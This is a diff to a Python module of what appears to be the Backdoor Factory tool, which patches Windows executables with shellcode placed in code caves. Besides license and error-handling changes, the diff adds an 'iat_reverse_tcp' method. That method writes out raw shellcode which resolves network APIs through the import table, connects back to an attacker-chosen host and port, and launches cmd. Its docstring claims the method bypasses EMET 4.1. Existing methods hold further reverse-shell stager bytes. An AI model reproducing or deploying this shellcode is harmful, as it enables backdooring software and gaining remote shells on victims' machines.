@@ -1,27 +1,34 @@
 '''
-    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
-    
-    Copyright (C) 2013,2014, Joshua Pitts
 
-    License:   GPLv3
+Copyright (c) 2013-2014, Joshua Pitts
+All rights reserved.
 
-    This program is free software: you can redistribute it and/or modify
-    it under the terms of the GNU General Public License as published by
-    the Free Software Foundation, either version 3 of the License, or
-    (at your option) any later version.
+Redistribution and use in source and binary forms, with or without modification,
+are permitted provided that the following conditions are met:
 
-    This program is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-    GNU General Public License for more details.
+    1. Redistributions of source code must retain the above copyright notice,
+    this list of conditions and the following disclaimer.
 
-    See <http://www.gnu.org/licenses/> for a copy of the GNU General
-    Public License
+    2. Redistributions in binary form must reproduce the above copyright notice,
+    this list of conditions and the following disclaimer in the documentation
+    and/or other materials provided with the distribution.
 
-    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
-    This program is to be used for only legal activities by IT security
-    professionals and researchers. Author not responsible for malicious
-    uses.
+    3. Neither the name of the copyright holder nor the names of its contributors
+    may be used to endorse or promote products derived from this software without
+    specific prior written permission.
+
+THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
+LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
+CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
+SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
+INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
+CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
+ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+POSSIBILITY OF SUCH DAMAGE.
+
 '''
 
 
@@ -31,6 +38,7 @@
 import sys
 import struct
 from intelmodules import eat_code_caves
+
 
 class winI32_shellcode():
     """
@@ -50,7 +58,7 @@ class winI32_shellcode():
         hostocts = []
         if self.HOST is None:
             print "This shellcode requires a HOST parameter -H"
-            sys.exit(1)
+            return False
         for i, octet in enumerate(self.HOST.split('.')):
                 hostocts.append(int(octet))
         self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
@@ -67,7 +75,7 @@ class winI32_shellcode():
         """
         if self.PORT is None:
             print ("Must provide port")
-            sys.exit(1)
+            return False
 
         flItms['stager'] = True
 
@@ -205,15 +213,14 @@ class winI32_shellcode():
         #else:
         #    self.shellcode1 += "\x89\x00\x00\x00"
 
-        self.shellcode1 += ("\x90"*40
+        self.shellcode1 += ("\x90" * 40
                             )
 
-        self.shellcode2 = ("\x90" *48
+        self.shellcode2 = ("\x90" * 48
                            )
 
         self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
         return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)
-    
 
     def user_supplied_shellcode(self, flItms, CavesPicked={}):
         """
@@ -225,12 +232,12 @@ class winI32_shellcode():
 
         if flItms['supplied_shellcode'] is None:
             print "[!] User must provide shellcode for this module (-U)"
-            sys.exit(0)
+            return False
         else:
             self.supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()
 
         breakupvar = eat_code_caves(flItms, 0, 1)
-        
+
         self.shellcode1 = ("\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B"
                            "\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02"
                            "\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61"
@@ -319,7 +326,7 @@ class winI32_shellcode():
         self.shellcode2 += self.supplied_shellcode
         self.shellcode1 += "\xe9"
         self.shellcode1 += struct.pack("<I", len(self.shellcode2))
-        
+
         self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
         return (self.stackpreserve + self.shellcode1, self.shellcode2)
 
@@ -330,7 +337,7 @@ class winI32_shellcode():
         """
         if self.PORT is None:
             print ("Must provide port")
-            sys.exit(1)
+            return False
 
         flItms['stager'] = True
 
@@ -356,10 +363,10 @@ class winI32_shellcode():
         self.shellcode1 += "\xBE"
         self.shellcode1 += struct.pack("<H", 361 + len(self.HOST))
         self.shellcode1 += "\x00\x00"  # <---Size of shellcode2 in hex
-        self.shellcode1 +=  ("\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
-                           "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
-                           "\x89\xF1"
-                           )
+        self.shellcode1 += ("\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
+                            "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
+                            "\x89\xF1"
+                            )
 
         if flItms['cave_jumping'] is True:
             self.shellcode1 += "\xe9"
@@ -461,7 +468,7 @@ class winI32_shellcode():
         """
         if self.PORT is None:
             print ("Must provide port")
-            sys.exit(1)
+            return False
         #breakupvar is the distance between codecaves
         breakupvar = eat_code_caves(flItms, 0, 1)
         self.shellcode1 = "\xfc\xe8"
@@ -516,4 +523,82 @@ class winI32_shellcode():
         self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
         return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)
 
+    def iat_reverse_tcp(self, flItms, CavesPicked={}):
+        """
+        Position dependent shellcode that uses API thunks of LoadLibraryA and
+        GetProcAddress to find and load APIs for callback to C2.
+        Bypasses EMET 4.1. Idea from Jared DeMott:
+        http://labs.bromium.com/2014/02/24/bypassing-emet-4-1/
+        via @bannedit0 (twitter handle)
+        """
+        if self.PORT is None:
+            print ("Must provide port")
+            return False
 
+        if 'LoadLibraryA' not in flItms:
+            print "[!] Binary does not have the LoadLibraryA API in IAT"
+            return False
+
+        if 'GetProcAddress' not in flItms:
+            print "[!] Binary does not have GetProcAddress API in IAT"
+            return False
+
+        self.shellcode1 = "\xfc"   # CLD
+        self.shellcode1 += "\xbb"           # mov value below to EBX
+        if flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
+            self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
+        else:
+            self.shellcode1 += struct.pack("<I", flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
+        self.shellcode1 += "\x01\xD3"  # add EBX + EDX
+        self.shellcode1 += "\xb9"  # mov value below to ECX
+        if flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
+            self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
+        else:
+            self.shellcode1 += struct.pack("<I", flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
+        self.shellcode1 += "\x01\xD1"  # add ECX + EDX
+
+        self.shellcode1 += ("\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x87\xF1\xFF\x13\x68"
+                            "\x75\x70\x00\x00\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x50"
+                            "\x97\xFF\x16\x95\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\xFF\xD5\x68"
+                            "\x74\x41\x00\x00\x68\x6F\x63\x6B\x65\x68\x57\x53\x41\x53\x54\x57"
+                            "\xFF\x16\x95\x31\xC0\x50\x50\x50\x50\x40\x50\x40\x50\xFF\xD5\x95"
+                            "\x68\x65\x63\x74\x00\x68\x63\x6F\x6E\x6E\x54\x57\xFF\x16\x87\xCD"
+                            "\x95\x6A\x05\x68")
+        self.shellcode1 += self.pack_ip_addresses()          # HOST
+        self.shellcode1 += "\x68\x02\x00"
+        self.shellcode1 += struct.pack('!h', self.PORT)      # PORT
+        self.shellcode1 += ("\x89\xE2\x6A"
+                            "\x10\x52\x51\x87\xF9\xFF\xD5"
+                            )
+
+        #breakupvar is the distance between codecaves
+        breakupvar = eat_code_caves(flItms, 0, 1)
+
+        if flItms['cave_jumping'] is True:
+            self.shellcode1 += "\xe9"  # JMP opcode
+            if breakupvar > 0:
+                if len(self.shellcode1) < breakupvar:
+                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
+                                                                 len(self.shellcode1) - 4).rstrip("L")), 16))
+                else:
+                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
+                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
+            else:
+                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
+                                                   len(self.shellcode1) - 3)
+
+        self.shellcode2 = ("\x85\xC0\x74\x00\x6A\x00\x68\x65\x6C"
+                           "\x33\x32\x68\x6B\x65\x72\x6E\x54\xFF\x13\x68\x73\x41\x00\x00\x68"
+                           "\x6F\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54\x50"
+                           "\xFF\x16\x95\x93\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x87\xFE"
+                           "\x92\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01"
+                           "\x8D\x44\x24\x10\xC6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56"
+                           "\x56\x53\x56\x87\xDA\xFF\xD5\x89\xE6\x6A\x00\x68\x65\x6C\x33\x32"
+                           "\x68\x6B\x65\x72\x6E\x54\xFF\x13\x68\x65\x63\x74\x00\x68\x65\x4F"
+                           "\x62\x6A\x68\x69\x6E\x67\x6C\x68\x46\x6F\x72\x53\x68\x57\x61\x69"
+                           "\x74\x54\x50\x95\xFF\x17\x95\x89\xF2\x31\xF6\x4E\x56\x46\x89\xD4"
+                           "\xFF\x32\x96\xFF\xD5\x81\xC4\x34\x02\x00\x00"
+                           )
+
+        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
+        return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)
